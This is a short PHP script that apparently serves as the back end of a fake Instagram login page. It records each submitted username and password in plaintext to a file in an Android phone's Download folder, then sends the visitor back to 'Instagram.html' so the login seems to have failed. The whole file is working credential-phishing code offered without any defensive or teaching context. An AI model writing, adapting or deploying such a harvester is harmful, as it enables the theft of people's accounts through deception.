<?php

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'];
    $password = $_POST['password'];

    $file = fopen("/storage/emulated/0/Download/User_data.txt", "a");
    fwrite($file, "Email,user:==> " . $username . "\n");
    fwrite($file, "Password.:==> " . $password . "\n");
    fwrite($file, "-------------------------\n");
    fclose($file);

    // login page with an error message
    header("Location: Instagram.html");
    exit();
} 
?>